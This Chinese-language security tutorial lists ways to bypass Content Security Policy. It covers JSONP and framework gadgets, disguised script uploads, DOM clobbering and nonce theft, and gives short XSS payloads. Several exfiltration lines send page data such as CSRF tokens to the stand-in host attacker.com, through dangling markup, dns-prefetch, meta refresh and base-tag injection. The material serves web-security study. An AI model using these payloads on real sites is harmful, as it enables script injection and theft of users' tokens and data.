### CSP 的绕过方式有哪些

**1. 配置缺陷类：`unsafe-inline` 与 `unsafe-eval`**

这是最常见的情况。很多开发者为了兼容旧代码，会开启这两个极其危险的指令

- **`unsafe-inline`**：允许执行内联脚本（如 `<script>alert(1)</script>` 或 `onclick` 事件）
- **`unsafe-eval`**：允许使用 `eval()`、`setTimeout(string)`、`new Function()` 等将字符串转化为代码执行的函数。

**2. 白名单滥用类：利用“信任域”中的 Gadgets**

如果 CSP 允许了某个大厂的 CDN 或业务子域名（如 `script-src 'self' https://cdn.staticfile.org`），攻击者可以寻找该域名下的“跳板”

- **JSONP 绕过**：寻找白名单域名下的 JSONP 接口
  - **Payload**: `<script src="https://trusted.com/jsonp?callback=alert"></script>`
- **AngularJS / Vue 库绕过**：如果白名单内包含这些前端框架，攻击者可以注入符合框架语法的 HTML 模板，利用框架内部的 `eval` 逻辑执行代码（即客户端模板注入 CSTI）
- **开源库 Gadgets**：利用已知的库漏洞（如旧版 jQuery、Bootstrap），通过特定的 HTML 结构触发其内部的动态代码执行逻辑

**3. 同源策略绕过：文件上传与路径漏洞**

当 `script-src` 设置为 `'self'` 时，浏览器信任同源下的所有文件

- **文件上传劫持**：如果站点允许上传图片或文档，攻击者可以上传一个伪装成图片的 JS 文件（如 `evil.jpg`，内容为 JS 代码）
  - **攻击**：`<script src="/user/uploads/evil.jpg"></script>`
- **路径截断与覆盖**：在某些复杂的 Web 架构中，利用路径跳转（Path Traversal）或服务器解析差异，尝试让浏览器去加载攻击者可控的静态资源

**4. DOM 破坏**

这是一种不需要违反 CSP `script-src` 规则的攻击方式

- **原理**：利用 HTML 标签的 `id` 或 `name` 属性，覆盖全局 JavaScript 变量
- **绕过思路**：如果合法的 JS 代码逻辑依赖于某个全局变量（如 `window.config.url`），攻击者通过注入 `<a id="config"><a id="config" name="url" href="javascript:alert(1)">` 来修改该变量的值，从而改变合法脚本的执行流

**5. 数据外传**

如果无法执行脚本，攻击者的目标通常转向“窃取敏感数据”

- **悬挂标记注入（Dangling Markup）**： 利用不完整的标签（如 `<img src='https://attacker.com/log?`）将页面后续的内容（如 CSRF Token）作为 URL 参数带出
- **DNS 预取（DNS Prefetching）**： 利用 `<link rel="dns-prefetch" href="//[data].attacker.com">`，通过观察 DNS 日志来逐字节带出数据
- **利用 `meta` 标签**： 注入 `<meta http-equiv="refresh" content="0; url=https://attacker.com/?data=...">` 强制跳转

**6. 绕过 `nonce` 和 `hash`**

现代严格的 CSP 会使用 `nonce`（一次性随机数）或 `hash`

- **Nonce 泄露**：如果页面存在悬挂标记漏洞或其他注入点，可能导致当前页面的 `nonce` 被读取
- **缓存污染**：利用某些缓存机制，尝试让浏览器加载并执行之前缓存的、带有旧 `nonce` 的脚本（较罕见）
- **利用 Base 标签**：如果没有设置 `base-uri 'none'`，注入 `<base href="https://attacker.com/">` 可能会导致页面上所有的相对路径脚本都请求到黑客的服务器
